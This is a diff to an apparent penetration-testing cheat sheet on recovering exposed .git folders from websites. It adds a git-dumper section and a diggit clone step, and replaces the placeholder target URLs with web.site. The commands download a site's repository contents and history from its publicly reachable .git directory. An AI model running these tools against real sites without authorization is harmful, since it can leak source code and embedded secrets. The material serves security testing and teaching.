@@ -117,11 +117,20 @@ sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 
 #### Automatic recovery
 
+##### git-dumper.py
+
+```powershell
+git clone https://github.com/arthaud/git-dumper
+pip install -r requirements.txt
+./git-dumper.py http://web.site/.git ~/website
+```
+
 ##### diggit.py
 
 ```powershell
+git clone https://github.com/bl4de/security-tools/ && cd security-tools/diggit
 ./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
-./diggit.py -u http://webpage.com -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
+./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
 
 -u is remote path, where .git folder exists
 -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init)
@@ -132,7 +141,7 @@ sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 
 ```powershell
 go get github.com/c-sto/gogitdumper
-gogitdumper -u http://urlhere.com/.git/ -o yourdecideddir/.git/
+gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/
 git log
 git checkout
 ```
